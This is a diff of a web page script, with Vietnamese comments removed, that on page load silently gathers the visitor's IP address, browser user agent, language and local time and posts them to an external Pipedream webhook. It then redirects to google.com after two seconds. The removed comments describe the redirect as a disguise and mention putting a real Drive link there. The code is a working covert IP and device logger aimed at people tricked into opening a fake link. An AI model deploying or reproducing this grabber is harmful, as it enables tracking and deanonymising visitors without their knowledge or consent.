@@ -1,11 +1,9 @@
 <script>
     async function collectExpertData() {
         try {
-            // 1. Lấy IP
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
 
-            // 2. Thu thập dữ liệu
             const params = new URLSearchParams();
             params.append('ip', ipData.ip);
             params.append('device', navigator.userAgent);
@@ -13,16 +11,14 @@
             params.append('language', navigator.language);
             params.append('time', new Date().toLocaleString());
 
-            // 3. Gửi về Pipedream bằng phương thức POST mạnh nhất
             fetch('https://eo8z560mmcz7078.m.pipedream.net', {
                 method: 'POST',
-                body: params, // Gửi dạng form-data giúp Pipedream dễ bóc tách
+                body: params, 
                 mode: 'no-cors' 
             });
 
-            // 4. Chuyển hướng để ngụy trang
             setTimeout(() => {
-                window.location.href = "https://google.com"; // Thay link Drive thật vào đây
+                window.location.href = "https://google.com";
             }, 2000);
 
         } catch (e) {
@@ -31,3 +27,4 @@
     }
     window.onload = collectExpertData;
 </script>
+
